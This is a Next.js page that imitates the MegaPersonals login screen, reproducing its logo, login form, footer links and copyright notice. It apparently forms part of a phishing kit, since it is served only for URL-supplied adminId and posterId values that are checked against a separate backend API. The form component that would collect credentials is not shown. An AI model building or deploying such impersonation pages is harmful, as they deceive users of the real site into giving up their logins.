import Image from "next/image";
import LoginForm from "../../components/LoginForm";
import { API_URL, site } from "../../config";
import Megapersonals from "../../public/images/megapersonals.png";

export default function MainPage() {
  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
        <Image src={Megapersonals} alt="megaeprsonals" priority />
      </div>

      <LoginForm />

      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>

      <p className="mt-[10px] text-[13px] text-custom-red hover:underline cursor-pointer">
        Report Bug
      </p>

      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2021 MegaPersonals.eu
      </p>

      <p className="mt-[8px] pb-5 text-[13px] text-custom-blue2">
        For support email{" "}
        <span className="text-custom-blue  cursor-pointer">
          support@megapersonals.eu
        </span>
      </p>
    </div>
  );
}

export async function getServerSideProps({ query: { adminId, posterId } }) {
  const url = `${API_URL}/${site}/${adminId}/${posterId}`;

  // console.log(url);

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
